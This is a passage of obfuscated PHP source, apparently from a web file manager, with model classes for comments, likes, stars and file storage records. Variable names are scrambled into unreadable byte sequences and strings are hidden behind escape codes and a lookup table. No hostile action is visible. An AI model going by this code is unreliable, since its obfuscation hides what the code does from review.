implode($“„½ò‰´[8], array_splice($õôçˆ¥ü, 1)); $ÚÁè›œ™ = $this->model->pathInfoByPath($õôçˆ¥ü[0], $Û¤Ùö‡Í); if (!$ÚÁè›œ™) { return !1; } $this->pathParse[$“„½ò‰´[1302]] = $ÚÁè›œ™[$“„½ò‰´[204]]; } return $this->infoParse($üÊÙşÑ×); } public function listAll($İÏíéì) { $‰‚Š´œª =& $_SERVER[¤øïŠ‹²]; $şï›šÖ = IO::info($this->pathParse[$‰‚Š´œª[98]]); if (!$şï›šÖ) { return array(); } $Ìó½÷ = $this->model->listAll($İÏíéì); $È•·Ï¶… = Model($‰‚Š´œª[693])->getInfo($şï›šÖ[$‰‚Š´œª[694]]); foreach ($Ìó½÷ as &$ÈÇùœ±ì) { check_abort(); $ÈÇùœ±ì[$‰‚Š´œª[101]] = Action($‰‚Š´œª[1489])->_shareItemeParse($ÈÇùœ±ì[$‰‚Š´œª[101]], $È•·Ï¶…); } unset($ÈÇùœ±ì); return $Ìó½÷; } } goto BáŒ†¨†ßø; EšÇñ…õô: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\x65" => "\143\x6f\x6d\155\x65\156\x74\x5f\x6d\x65\x74\141", "\155\x65\164\x61\106\151\145\x6c\144" => "\x63\157\x6d\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ìÊÏä›ü) { $èä¯úÀÀ =& $_SERVER[¤øïŠ‹²]; if ($ìÊÏä›ü[$èä¯úÀÀ[2159]]) { $ŞÓ½ ® = $this->where(array($èä¯úÀÀ[2160] => $ìÊÏä›ü[$èä¯úÀÀ[2159]]))->find(); if (!$ŞÓ½ ® || $ŞÓ½ ®[$èä¯úÀÀ[201]] != $ìÊÏä›ü[$èä¯úÀÀ[201]] || $ŞÓ½ ®[$èä¯úÀÀ[595]] != $ìÊÏä›ü[$èä¯úÀÀ[595]]) { return !1; } $this->where(array($èä¯úÀÀ[2160] => $ìÊÏä›ü[$èä¯úÀÀ[2159]]))->setAdd($èä¯úÀÀ[2161], 1); } $ìÊÏä›ü[$èä¯úÀÀ[2162]] = 0; $ìÊÏä›ü[$èä¯úÀÀ[2161]] = 0; $ìÊÏä›ü[$èä¯úÀÀ[851]] = 1; return $this->add($ìÊÏä›ü); } public function commentCount($ş ğ®ŒÕ, $ÚÚ çå, $şò›‰¸ı = false) { $‘´ªü’ =& $_SERVER[¤øïŠ‹²]; if (!$ş ğ®ŒÕ) { return array(); } if (is_string($ş ğ®ŒÕ) || is_int($ş ğ®ŒÕ)) { $ş ğ®ŒÕ = array($ş ğ®ŒÕ); } $¼üˆš›Í = array($‘´ªü’[595], $‘´ªü’[2163] => $‘´ªü’[591]); $¿Úòâ€¤ = array($‘´ªü’[595] => array($‘´ªü’[7], $ş ğ®ŒÕ), $‘´ªü’[201] => $ÚÚ çå); if ($şò›‰¸ı) { $¿Úòâ€¤[$‘´ªü’[1542]] = $şò›‰¸ı; } $ÀØ£¡Å­ = $this->field($¼üˆš›Í)->where($¿Úòâ€¤)->group($‘´ªü’[595])->select(); return array_to_keyvalue($ÀØ£¡Å­, $‘´ªü’[595], $‘´ªü’[591]); } public function starTarget($€Éô·Ö“, $ öíÓÈÁ) { $ŠŞ„ùüŠ =& $_SERVER[¤øïŠ‹²]; $‘Æô‹ = $€Éô·Ö“ + self::TYPE_STAR_OFFSET; $º–ºƒ³Ê = array($ŠŞ„ùüŠ[1542] => USER_ID, $ŠŞ„ùüŠ[201] => $‘Æô‹, $ŠŞ„ùüŠ[595] => $ öíÓÈÁ); $ÖğÈÈôè = $this->where($º–ºƒ³Ê)->find(); if ($ÖğÈÈôè) { return $this->where(array($ŠŞ„ùüŠ[493] => $ÖğÈÈôè[$ŠŞ„ùüŠ[493]]))->delete(); } $óß¥ƒ‡¬ = array($ŠŞ„ùüŠ[2159] => 0, $ŠŞ„ùüŠ[1542] => USER_ID, $ŠŞ„ùüŠ[851] => 1, $ŠŞ„ùüŠ[181] => $ŠŞ„ùüŠ[12], $ŠŞ„ùüŠ[201] => $‘Æô‹, $ŠŞ„ùüŠ[595] => $ öíÓÈÁ, $ŠŞ„ùüŠ[2162] => 0, $ŠŞ„ùüŠ[2161] => 0); return $this->add($óß¥ƒ‡¬); } public function starTargetCount($àîğ‘¥é, $Ÿ•ÆßÍ) { $ÊÒ‚Ã¼’ =& $_SERVER[¤øïŠ‹²]; $¶Æ„Ù“÷ = $Ÿ•ÆßÍ + self::TYPE_STAR_OFFSET; $˜«ğÉ×ã = $this->commentCount($àîğ‘¥é, $¶Æ„Ù“÷); $ÖÑƒ…¥ò = $this->commentCount($àîğ‘¥é, $¶Æ„Ù“÷, USER_ID); return array($ÊÒ‚Ã¼’[2164] => $˜«ğÉ×ã, $ÊÒ‚Ã¼’[2165] => $ÖÑƒ…¥ò); } public function starTargetUserList($‘±’Ê‰», $éÓ±£í£) { $´ÀòÏúç =& $_SERVER[¤øïŠ‹²]; $ö©úƒ‚® = $‘±’Ê‰» + self::TYPE_STAR_OFFSET; $“ğëšóº = array($´ÀòÏúç[595] => $éÓ±£í£, $´ÀòÏúç[201] => $ö©úƒ‚®); $Òôù¶ = $this->where($“ğëšóº)->count(); $µ±´Ì©¢ = array($´ÀòÏúç[344] => $Òôù¶, $´ÀòÏúç[2166] => array()); if (!$Òôù¶) { return $µ±´Ì©¢; } $„ÆÎş²Ë = $this->field($´ÀòÏúç[1542])->where($“ğëšóº)->limit(500)->select(); $„ÆÎş²Ë = array_to_keyvalue($„ÆÎş²Ë, $´ÀòÏúç[12], $´ÀòÏúç[1542]); $µ±´Ì©¢[$´ÀòÏúç[2166]] = Model($´ÀòÏúç[603])->userListInfo($„ÆÎş²Ë); return $µ±´Ì©¢; } public function prasiseUserList($Ğæ¡´áÆ) { $ÀşâÌáŒ =& $_SERVER[¤øïŠ‹²]; $ßäÇîˆ• = array($ÀşâÌáŒ[2167] => $Ğæ¡´áÆ); $÷±­¼ö = $this->where($ßäÇîˆ•)->find(); $Ü–ÀŒ® = _get($÷±­¼ö, $ÀşâÌáŒ[2162], 0); $ìÃ»“„· = array($ÀşâÌáŒ[344] => $Ü–ÀŒ®, $ÀşâÌáŒ[2166] => array()); if (!$Ü–ÀŒ®) { return $ìÃ»“„·; } $î½İ¹äõ = Model($ÀşâÌáŒ[2168])->field($ÀşâÌáŒ[1542])->where($ßäÇîˆ•)->limit(500)->select(); $î½İ¹äõ = array_to_keyvalue($î½İ¹äõ, $ÀşâÌáŒ[12], $ÀşâÌáŒ[1542]); $ìÃ»“„·[$ÀşâÌáŒ[2166]] = Model($ÀşâÌáŒ[603])->userListInfo($î½İ¹äõ); return $ìÃ»“„·; } public function remove($Ôİ¯ÏâÄ) { $¿Š¦íë =& $_SERVER[¤øïŠ‹²]; $·›ËŠÑ = array($¿Š¦íë[2160] => $Ôİ¯ÏâÄ); $áÑÑ²†¾ = $this->where($·›ËŠÑ)->find(); if ($áÑÑ²†¾[$¿Š¦íë[2159]]) { $this->where(array($¿Š¦íë[2160] => $áÑÑ²†¾[$¿Š¦íë[2159]]))->setAdd($¿Š¦íë[2161], -1); } return $this->removeArray($Ôİ¯ÏâÄ); } public function edit($£Î³ßşë, $ú­–ÕñÆ) { $®â”¤à =& $_SERVER[¤øïŠ‹²]; $ñÌ°«é£ = array($®â”¤à[2160] => $£Î³ßşë); return $this->where($ñÌ°«é£)->save(array($®â”¤à[2169] => $ú­–ÕñÆ)); } public function prasise($Æİ‘‹ĞÃ) { $—Ëù¯Ë§ =& $_SERVER[¤øïŠ‹²]; $Êã®ÂÂŒ = Model($—Ëù¯Ë§[2170]); $ê®„ˆïÏ = array($—Ëù¯Ë§[2160] => $Æİ‘‹ĞÃ, $—Ëù¯Ë§[1916] => USER_ID); $Ã„…ı‰È = $Êã®ÂÂŒ->where($ê®„ˆïÏ)->find(); if (!$Ã„…ı‰È) { $Êã®ÂÂŒ->add($ê®„ˆïÏ); $Û§‡í†“ = $this->where(array($—Ëù¯Ë§[2160] => $Æİ‘‹ĞÃ))->setAdd($—Ëù¯Ë§[2162], 1); } else { $Êã®ÂÂŒ->where($ê®„ˆïÏ)->delete(); $Û§‡í†“ = $this->where(array($—Ëù¯Ë§[2160] => $Æİ‘‹ĞÃ))->setAdd($—Ëù¯Ë§[2162], -1); } return $Û§‡í†“; } public function targetInfo($¼‰²é, $©ø°‘Û) { $Áµğ¡ñö =& $_SERVER[¤øïŠ‹²]; $×›Í’³ = array($Áµğ¡ñö[677] => $¼‰²é, $Áµğ¡ñö[678] => $©ø°‘Û); $…ïïñ¢Ÿ = $this->where($×›Í’³)->count(); $²¿…Áú = "\122\x49\107\110\x54\x20\x4a\x4f\111\116\40{$this->tablePrefix}\x63\157\x6d\155\145\x6e\164\x5f\x70\x72\141\151\163\x65\x20\163\164\x61\x72\x20\x6f\x6e\40\x63\x6f\155\155\145\x6e\x74\56\x63\x6f\x6d\x6d\145\x6e\164\111\x44\40\75\40\x73\x74\141\x72\x2e\x63\157\155\155\x65\156\164\111\x44"; $óÁ¾Ó€Á = $this->alias($Áµğ¡ñö[441])->where($×›Í’³)->join($²¿…Áú, $Áµğ¡ñö[2171])->count(); $—¨Ú¸ãõ = array($Áµğ¡ñö[2172] => $…ïïñ¢Ÿ, $Áµğ¡ñö[2173] => $óÁ¾Ó€Á); return $—¨Ú¸ãõ; } public function listData($Ú¤¼‰ş¬) { $Ë™ê«¿í =& $_SERVER[¤øïŠ‹²]; if (isset($Ú¤¼‰ş¬[$Ë™ê«¿í[2174]])) { if ($Ú¤¼‰ş¬[$Ë™ê«¿í[2174]]) { $Ú¤¼‰ş¬[$Ë™ê«¿í[2167]] = array($Ë™ê«¿í[1130], intval($Ú¤¼‰ş¬[$Ë™ê«¿í[2174]])); } unset($Ú¤¼‰ş¬[$Ë™ê«¿í[2174]]); } if (isset($Ú¤¼‰ş¬[$Ë™ê«¿í[2175]])) { if ($Ú¤¼‰ş¬[$Ë™ê«¿í[2175]]) { $Ú¤¼‰ş¬[$Ë™ê«¿í[2167]] = array($Ë™ê«¿í[1127], intval($Ú¤¼‰ş¬[$Ë™ê«¿í[2175]])); } unset($Ú¤¼‰ş¬[$Ë™ê«¿í[2175]]); } return $this->_listData($Ú¤¼‰ş¬); } private function _listData($Ïšâİ¦œ) { $‚òßÕÃ =& $_SERVER[¤øïŠ‹²]; $»±÷–£Ä = $this->where($Ïšâİ¦œ)->_makeOrder()->selectPage(100); $this->_listAppendParent($»±÷–£Ä[$‚òßÕÃ[457]]); $this->_listAppendUser($»±÷–£Ä[$‚òßÕÃ[457]]); $this->_listAppendMeta($»±÷–£Ä[$‚òßÕÃ[457]]); return $»±÷–£Ä; } private function _makeOrder() { $úçàË­½ =& $_SERVER[¤øïŠ‹²]; $ø£µ‘¤í = array($úçàË­½[2162], $úçàË­½[2161], $úçàË­½[244]); $ĞøãÂŠÀ = Input::get($úçàË­½[550], $úçàË­½[7], $úçàË­½[518], $ø£µ‘¤í); $½èú®¡» = Input::get($úçàË­½[551], $úçàË­½[7], $úçàË­½[1918], array($úçàË­½[2176], $úçàË­½[546])); $¶¯ù¶‡‚ = $ĞøãÂŠÀ . $úçàË­½[53] . $½èú®¡»; return $this->order($¶¯ù¶‡‚); } private function _listAppendParent(&$áÀ¿²…) { $ÛÖº‹ºñ =& $_SERVER[¤øïŠ‹²]; $ø–áßìÉ = array_unique(array_to_keyvalue($áÀ¿²…, $ÛÖº‹ºñ[12], $ÛÖº‹ºñ[2159])); $ø–áßìÉ = array_remove_value($ø–áßìÉ, $ÛÖº‹ºñ[241]); if (!$ø–áßìÉ) { return; } $˜ùîµ«Ò = $this->where(array($ÛÖº‹ºñ[2160] => array($ÛÖº‹ºñ[7], $ø–áßìÉ)))->select(); $˜ùîµ«Ò = array_to_keyvalue($˜ùîµ«Ò, $ÛÖº‹ºñ[2167]); foreach ($áÀ¿²… as &$Û»¬ÅÊğ) { if (isset($˜ùîµ«Ò[$Û»¬ÅÊğ[$ÛÖº‹ºñ[2159]]])) { $Û»¬ÅÊğ[$ÛÖº‹ºñ[2177]] = $˜ùîµ«Ò[$Û»¬ÅÊğ[$ÛÖº‹ºñ[2159]]]; } } unset($Û»¬ÅÊğ); } private function _listAppendUser(&$È„ş¿Çà) { $èÖ™ˆ“ =& $_SERVER[¤øïŠ‹²]; $¦•˜Âİ = array_unique(array_to_keyvalue($È„ş¿Çà, $èÖ™ˆ“[12], $èÖ™ˆ“[1542])); $¦•˜Âİ = array_remove_value($¦•˜Âİ, $èÖ™ˆ“[241]); if (count($¦•˜Âİ) == 0) { return; } foreach ($È„ş¿Çà as $Š¸©üÔş) { if (isset($Š¸©üÔş[$èÖ™ˆ“[2177]])) { $¦•˜Âİ[] = $Š¸©üÔş[$èÖ™ˆ“[2177]][$èÖ™ˆ“[1542]]; } } $Ûòª¦ö = Model($èÖ™ˆ“[623])->userListInfo($¦•˜Âİ); foreach ($È„ş¿Çà as &$Š¸©üÔş) { $Š¸©üÔş[$èÖ™ˆ“[691]] = $Ûòª¦ö[$Š¸©üÔş[$èÖ™ˆ“[1542]]]; if (isset($Š¸©üÔş[$èÖ™ˆ“[2177]])) { $Š¸©üÔş[$èÖ™ˆ“[2177]][$èÖ™ˆ“[691]] = $Ûòª¦ö[$Š¸©üÔş[$èÖ™ˆ“[2177]][$èÖ™ˆ“[1542]]]; } } unset($Š¸©üÔş); } private function _listAppendMeta(&$÷ßÃ›¿ß) { $°·¶Ş”Ü =& $_SERVER[¤øïŠ‹²]; $÷Áêãœ = array_unique(array_to_keyvalue($÷ßÃ›¿ß, $°·¶Ş”Ü[12], $°·¶Ş”Ü[2167])); $÷Áêãœ = array_remove_value($÷Áêãœ, $°·¶Ş”Ü[241]); if (!$÷Áêãœ) { return; } foreach ($÷ßÃ›¿ß as $±¤ÇÏÅÈ) { if (isset($±¤ÇÏÅÈ[$°·¶Ş”Ü[2177]])) { $÷Áêãœ[] = $±¤ÇÏÅÈ[$°·¶Ş”Ü[2177]][$°·¶Ş”Ü[2167]]; } } $‹ÉãüÊ³ = $this->metaList($÷Áêãœ); if (!$‹ÉãüÊ³) { return !1; } foreach ($÷ßÃ›¿ß as &$±¤ÇÏÅÈ) { $±¤ÇÏÅÈ[$°·¶Ş”Ü[561]] = $‹ÉãüÊ³[$±¤ÇÏÅÈ[$°·¶Ş”Ü[2167]]]; if (isset($±¤ÇÏÅÈ[$°·¶Ş”Ü[2177]])) { $±¤ÇÏÅÈ[$°·¶Ş”Ü[2177]][$°·¶Ş”Ü[561]] = $‹ÉãüÊ³[$±¤ÇÏÅÈ[$°·¶Ş”Ü[2177]][$°·¶Ş”Ü[2167]]]; } } unset($±¤ÇÏÅÈ); } private function metaList($¨ô„ŸÜ) { $ãı†é“é =& $_SERVER[¤øïŠ‹²]; if (!$¨ô„ŸÜ) { return array(); } $Üë¶ŞÈ… = array($ãı†é“é[2167] => array($ãı†é“é[7], $¨ô„ŸÜ)); $œÍò‹Ã™ = Model($ãı†é“é[2178])->where($Üë¶ŞÈ…)->select(); $œÍò‹Ã™ = array_to_keyvalue_group($œÍò‹Ã™, $ãı†é“é[2167]); foreach ($œÍò‹Ã™ as $ªĞõ€§ => $ªêÆÊÃ˜) { $ÀÁûó¦… = array(); foreach ($ªêÆÊÃ˜ as $ı£§‚È‹) { $ÀÁûó¦…[$ı£§‚È‹[$ãı†é“é[106]]] = $ı£§‚È‹[$ãı†é“é[462]]; } $œÍò‹Ã™[$ªĞõ€§] = $ÀÁûó¦…; } return $œÍò‹Ã™ ? $œÍò‹Ã™ : array(); } public function removeTarget($Û³á¡¡õ, $õöüµï») { $Åû‘«‹˜ =& $_SERVER[¤øïŠ‹²]; if (!$õöüµï») { return !0; } $õöüµï» = is_array($õöüµï») ? $õöüµï» : array($õöüµï»); $Í‹œ€Î© = array($Åû‘«‹˜[201] => $Û³á¡¡õ, $Åû‘«‹˜[595] => array($Åû‘«‹˜[7], $õöüµï»)); $ß‹Œ·úû = $this->field($Åû‘«‹˜[2167])->where($Í‹œ€Î©)->select(); $ğŒŞÀ… = array_to_keyvalue($ß‹Œ·úû, $Åû‘«‹˜[12], $Åû‘«‹˜[2167]); return $this->removeArray($ğŒŞÀ…); } public function removeArray($šÄ¸®÷Æ) { $äøºèŸ› =& $_SERVER[¤øïŠ‹²]; if (!$šÄ¸®÷Æ) { return !0; } $šÄ¸®÷Æ = is_array($šÄ¸®÷Æ) ? $šÄ¸®÷Æ : array($šÄ¸®÷Æ); $Å‚ŸÛÏ = array($äøºèŸ›[2167] => array($äøºèŸ›[7], $šÄ¸®÷Æ)); Model($äøºèŸ›[2170])->where($Å‚ŸÛÏ)->delete(); Model($äøºèŸ›[2179])->where($Å‚ŸÛÏ)->delete(); return $this->where($Å‚ŸÛÏ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145\x5f\x63\157\156\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\151\155\x65", "\151\x6e\x73\145\162\164", "\146\165\x6e\x63\164\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\x6d\145" => "\151\x6f\x5f\x66\151\x6c\x65\137\155\x65\x74\141", "\x6d\145\164\141\106\151\x65\154\144" => "\x66\151\x6c\145\x49\104"); public function fileInfo($§Úºı¸Ê) { $æòİì» =& $_SERVER[¤øïŠ‹²]; static $ô‰º†ÑÑ = array(); if (!isset($ô‰º†ÑÑ[$§Úºı¸Ê])) { $ğíüú¶» = $æòİì»[2180]; $«æìÊß‚ = Model($æòİì»[566])->field($ğíüú¶»)->where(array($æòİì»[564] => $§Úºı¸Ê))->find(); $ô‰º†ÑÑ[$§Úºı¸Ê] = $«æìÊß‚; } return $ô‰º†ÑÑ[$§Úºı¸Ê]; } public function addFileByContent($±µ¾„¸‹ = '', $«Ã¨—àË, $ùÌğï“« = '') { $Û…Ÿ¼û™ =& $_SERVER[¤øïŠ‹²]; $ò‹«Å¼× = TEMP_PATH . $Û…Ÿ¼û™[2181]; if (!is_dir($ò‹«Å¼×)) { mk_dir($ò‹«Å¼×); } $¤ê×°çö = $ò‹«Å¼× . $Û…Ÿ¼û™[2182] . rand_string(16); $ÄØÄ½Ï = file_put_contents($¤ê×°çö, $±µ¾„¸‹); if ($ÄØÄ½Ï === !1 || strlen($±µ¾„¸‹) != $ÄØÄ½Ï) { return !1; } $úÅ¨¹òİ = $this->addFile($¤ê×°çö, $«Ã¨—àË, $ùÌğï“«, !0); if (file_exists($¤ê×°çö)) { @unlink($¤ê×°çö); } return $úÅ¨¹òİ; } public function createFileName($Èİ´Ù‘¿, $¸Œ¢¡°ê, $åÃÏ¹œ‡ = false, $åš‡Ş„ˆ = false) { $©€ÙÙúö =& $_SERVER[¤øïŠ‹²]; $©‡Ô¬š¨ = IO::init($©€ÙÙúö[8]); $ÑïÆ©ú– = $this->_makeFilePath($Èİ´Ù‘¿, $¸Œ¢¡°ê, $©‡Ô¬š¨, $åÃÏ¹œ‡, $åš‡Ş„ˆ); $ıÀ¦Œû¶ = $©‡Ô¬š¨->pathFather($ÑïÆ©ú–); static $ƒÜÃï– = false; $»Û‘Í•½ = $©€ÙÙúö[2183] . md5($ıÀ¦Œû¶); if (!$ƒÜÃï– && !Cache::get($»Û‘Í•½)) { $ƒÜÃï– = !0; $ØüŸ®ØÒ = IO::mkdir($ıÀ¦Œû¶); if (!IO::exist($ØüŸ®ØÒ . $©€ÙÙúö[903])) { IO::mkfile($ØüŸ®ØÒ . $©€ÙÙúö[903]); } Cache::set($»Û‘Í•½, 1, 3600 * 2); } return $ÑïÆ©ú–; } public function _makeFilePath($à×ŒÕ‘, $ñÅÇÓ™±, $Ÿ¹Çô‹‡, $âÙ•„‹ = false, $Æ£’Ï = false) { $ÛæÈúÊú =& $_SERVER[¤øïŠ‹²]; $°¢ß¸Ï = Model($ÛæÈúÊú[874])->get($ÛæÈúÊú[2184]); $êÇ÷¥Çø = $ÛæÈúÊú[1374] . $ñÅÇÓ™±[$ÛæÈúÊú[493]] . $ÛæÈúÊú[505] . date($ÛæÈúÊú[2185]); $ö±÷ÊêØ = $êÇ÷¥Çø . rand_string(5) . short_id(100); $à×ŒÕ‘ = str_replace($ÛæÈúÊú[8], $ÛæÈúÊú[11], KodIO::clear($à×ŒÕ‘)); $Ñ°áÔü¢ = $Ÿ¹Çô‹‡->ext($à×ŒÕ‘); if (!$à×ŒÕ‘) { $°¢ß¸Ï = $ÛæÈúÊú[880]; } switch ($°¢ß¸Ï) { case $ÛæÈúÊú[2186]: if ($Ñ°áÔü¢) { $ö±÷ÊêØ = $ö±÷ÊêØ . $ÛæÈúÊú[10] . $Ñ°áÔü¢; } if ($Ñ°áÔü¢ == $ÛæÈúÊú[2124]) { $ö±÷ÊêØ .= $ÛæÈúÊú[1343]; } break; case $ÛæÈúÊú[2187]: $·õ™¼…‡ = Model($ÛæÈúÊú[874])->get($ÛæÈúÊú[875]); $¬—Â™É› = substr(md5($ÛæÈúÊú[876] . $·õ™¼…‡ . date($ÛæÈúÊú[850])), 0, 8); $êÇ÷¥Çø = $ÛæÈúÊú[1374] . $ñÅÇÓ™±[$ÛæÈúÊú[493]] . $ÛæÈúÊú[505] . date($ÛæÈúÊú[2188]) . $¬—Â™É› . $ÛæÈúÊú[8]; if ($Ñ°áÔü¢ == $ÛæÈúÊú[2124]) { $à×ŒÕ‘ .= $ÛæÈúÊú[1343]; } $ôÏÛÓ‚¸ = $ÛæÈúÊú[2189] . $êÇ÷¥Çø . $à×ŒÕ‘; CacheLock::lock($ôÏÛÓ‚¸); $ö±÷ÊêØ = $êÇ÷¥Çø . $à×ŒÕ‘; if (IO::exist($êÇ÷¥Çø . $à×ŒÕ‘)) { $×ş¾ˆ¨ = substr($à×ŒÕ‘, 0, strlen($à×ŒÕ‘) - strlen($Ñ°áÔü¢)); $·˜´°¯ = $Æ£’Ï ? substr($Æ£’Ï, 0, 5) : ($âÙ•„‹ ? substr($âÙ•„‹, 0, 5) : rand_string(5)); $·˜´°¯ .= rand_string(3); $ö±÷ÊêØ = $êÇ÷¥Çø . $×ş¾ˆ¨ . $·˜´°¯; if ($Ñ°áÔü¢) { $ö±÷ÊêØ = $ö±÷ÊêØ . $ÛæÈúÊú[10] . $Ñ°áÔü¢; } } if (IO::isOsDriver($ö±÷ÊêØ) && !IO::isUploadServer($ö±÷ÊêØ)) { if (IO::exist($ö±÷ÊêØ)) { CacheLock::unlock($ôÏÛÓ‚¸); return $ö±÷ÊêØ; } $¸¦¯­š‹ = IO::setContent($ö±÷ÊêØ, $ÛæÈúÊú[12]); if (!$¸¦¯­š‹) { show_json($ÛæÈúÊú[2190], !1); } } CacheLock::unlock($ôÏÛÓ‚¸); break; case $ÛæÈúÊú[880]: break; default: break; } return $ö±÷ÊêØ; } public function addFileByRemote($¸ıâˆßŠ, $¾…ûÑ¿, $ÓëßŸÒ¦ = array()) { $‰½ª şÎ =& $_SERVER[¤øïŠ‹²]; if (!IO::isFile($¸ıâˆßŠ)) { return !1; } $¸Îï“ö = $ÓëßŸÒ¦[$‰½ª şÎ[569]] ? $ÓëßŸÒ¦[$‰½ª şÎ[569]] : $‰½ª şÎ[12]; $ıÁ‡í  = IO::hashMd5($¸ıâˆßŠ, $¸Îï“ö); $Ç˜ŸñÉ = KodIO::parse($¸ıâˆßŠ); $ÖÂåš”Ä = array($‰½ª şÎ[646] => IO::size($¸ıâˆßŠ), $‰½ª şÎ[2191] => 1, $‰½ª şÎ[515] => $¾…ûÑ¿, $‰½ª şÎ[917] => $Ç˜ŸñÉ[$‰½ª şÎ[493]], $‰½ª şÎ[516] => $¸ıâˆßŠ, $‰½ª şÎ[2192] => $ÓëßŸÒ¦[$‰½ª şÎ[701]] ? $ÓëßŸÒ¦[$‰½ª şÎ[701]] : IO::hashSimple($¸ıâˆßŠ), $‰½ª şÎ[2193] => $ıÁ‡í  ? $ıÁ‡í  : $¸Îï“ö); if ($ÄÈó‹–Œ = $this->addFileCheckExist($ÖÂåš”Ä[$‰½ª şÎ[701]], $ÖÂåš”Ä[$‰½ª şÎ[569]], $ÖÂåš”Ä[$‰½ª şÎ[90]])) { return $ÄÈó‹–Œ; } return $this->addFileData($ÖÂåš”Ä); } private function addFileData($÷ì±İÅ) { $ ­Šßˆ‰ =& $_SERVER[¤øïŠ‹²]; if (!$÷ì±İÅ) { return !1; } if (!IO::isFile($÷ì±İÅ[$ ­Šßˆ‰[98]])) { return !1; } $÷ì±İÅ[$ ­Šßˆ‰[90]] = intval($÷ì±İÅ[$ ­Šßˆ‰[90]]); if (!$÷ì±İÅ[$ ­Šßˆ‰[90]] && strlen($÷ì±İÅ[$ ­Šßˆ‰[701]]) > 32) { $÷ì±İÅ[$ ­Šßˆ‰[90]] = intval(substr($÷ì±İÅ[$ ­Šßˆ‰[701]], 32)); } $ÜÊá½¹æ = $this->add($÷ì±İÅ); return $this->find($ÜÊá½¹æ); } public function addFile($ŒüèÅÜÈ, $½‡âæÚö, $“âÙÄ´, $Á£Á®Ä½ = false) { $ª…«ß€„ =& $_SERVER[¤øïŠ‹²]; $Ä†¨¨  = IO::hashSimple($ŒüèÅÜÈ); $ñ™Ç»… = IO::size($ŒüèÅÜÈ); $şïÕ”á  = $ñ™Ç»… <= 1024 * 1024 * 10 ? IO::hashMd5($ŒüèÅÜÈ) : $ª…«ß€„[12]; $…‚ñ¥Ò‡ = $ª…«ß€„[2194] . $Ä†¨¨ ; CacheLock::lock($…‚ñ¥Ò‡); if ($şïÕ”á  && $Ä†¨¨ ) { $ìÄØ±à = $this->addFileCheckExist($Ä†¨¨ , $şïÕ”á , $ñ™Ç»…); if ($ìÄØ±à) { CacheLock::unlock($…‚ñ¥Ò‡); return $ìÄØ±à; } } $Öà—¹¡‰ = $this->addFileMake($ŒüèÅÜÈ, $½‡âæÚö, $ñ™Ç»…, $Ä†¨¨ , $şïÕ”á , $“âÙÄ´, $Á£Á®Ä½); $¥¹’­£• = $this->addFileData($Öà—¹¡‰); if (!$¥¹’­£•) { return !1; } CacheLock::unlock($…‚ñ¥Ò‡); if (!$şïÕ”á  && $¥¹’­£•) { $this->fileMd5Check($¥¹’­£•); } return $¥¹’­£•; } public function fileMd5Check($Û‰µîìŸ) { $Õ‘Æ…¿Å =& $_SERVER[¤øïŠ‹²]; $¸¯Şø = array($Û‰µîìŸ[$Õ‘Æ…¿Å[563]], $Û‰µîìŸ[$Õ‘Æ…¿Å[98]]); $ó‘ğÜÙÍ = $Õ‘Æ…¿Å[2195] . $Û‰µîìŸ[$Õ‘Æ…¿Å[98]]; $Ö©é¨ÀÙ = $Õ‘Æ…¿Å[2196] . $Û‰µîìŸ[$Õ‘Æ…¿Å[563]]; TaskQueue::add($Õ‘Æ…¿Å[2197], $¸¯Şø, $ó‘ğÜÙÍ, $Ö©é¨ÀÙ); } public function fileMd5Set($”ø¿œÉ, $«‹şÙ¤) { $å§èíÖ =& $_SERVER[¤øïŠ‹²]; $Œ¦òÂã = $this->find($”ø¿œÉ); if (!$Œ¦òÂã || $Œ¦òÂã[$å§èíÖ[569]]) { return; } $äìÕŒ¬Ç = IO::hashMd5($«‹şÙ¤); if (!$äìÕŒ¬Ç) { return $å§èíÖ[12]; } $this->where(array($å§èíÖ[563] => $”ø¿œÉ))->save(array($å§èíÖ[569] => $äìÕŒ¬Ç)); } public function addFileMake($»òâ¡´ò, $‹ø£ÊĞ , $‘ñø§ß, $õóÀÕˆÉ, $Ÿ¼‘ñ¶ , $™ßƒ–µÀ, $÷ëË¶€â) { $ªÙÀ¤æ¿ =& $_SERVER[¤øïŠ‹²]; $ª¢×•© = $this->createFileName($™ßƒ–µÀ, $‹ø£ÊĞ , $õóÀÕˆÉ, $Ÿ¼‘ñ¶ ); $Äá÷øà’ = get_path_father($ª¢×•©); $ß³âôØ = get_path_this($ª¢×•©); if ($÷ëË¶€â) { $—˜É¾ = IO::move($»òâ¡´ò, $Äá÷øà’, !1, $ß³âôØ); } else { $—˜É¾ = IO::copy($»òâ¡´ò, $Äá÷øà’, !1, $ß³âôØ); } if (!$—˜É¾) { return !1; } $õè¢± = IO::init($—˜É¾); $õè¢±->cacheMethod($ªÙÀ¤æ¿[192], $õè¢±->path, $ªÙÀ¤æ¿[189]); if (IO::size($—˜É¾) != $‘ñø§ß) { return !1; } $¹’Öå = array($ªÙÀ¤æ¿[646] => $‘ñø§ß, $ªÙÀ¤æ¿[2191] => 1, $ªÙÀ¤æ¿[515] => $™ßƒ–µÀ, $ªÙÀ¤æ¿[917] => $‹ø£ÊĞ [$ªÙÀ¤æ¿[493]], $ªÙÀ¤æ¿[516] => $ª¢×•©, $ªÙÀ¤æ¿[2192] => $õóÀÕˆÉ, $ªÙÀ¤æ¿[2193] => $Ÿ¼‘ñ¶ ); return $¹’Öå; } public function addFileCheckExist($íüú«ëı, $®óÄ»±, $¹™Œ¤±) { $¨¦ç¦¬‚ =& $_SERVER[¤øïŠ‹²]; $»’Í§ÁÊ = $this->findByHash($íüú«ëı, $®óÄ»±); if (!$»’Í§ÁÊ) { return !1; } $…‡·­Ø³ = array($¨¦ç¦¬‚[2191] => 